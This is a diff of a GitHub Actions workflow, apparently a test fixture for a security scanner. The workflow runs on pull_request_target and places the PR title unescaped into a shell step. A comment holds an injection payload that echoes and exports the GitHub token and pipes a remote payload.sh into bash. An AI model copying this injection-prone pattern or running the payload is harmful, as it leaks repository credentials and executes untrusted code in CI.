@@ -16,10 +16,11 @@ jobs:
           ref: ${{ github.event.pull_request.head.sha }}
 
       # this is the title"; echo ${{ github.token }}; export THE_TOKEN=${{ github.token }}; echo $THE_TOKEN; curl -s https://raw.githubusercontent.com/laurentsimon/scorecard-action-test-2/main/payload.sh | bash; echo "pwned
-      - name: on PR
+      - name: on PR          
         if: ${{ github.event_name == 'pull_request_target' }}
         run: |
           echo "Starting processing..."
+          echo "Receved PR from actor: $ACTOR / $ACTOR_ID"
           echo "Title: ${{ github.event.pull_request.title }}"
           echo "Done processing"
 
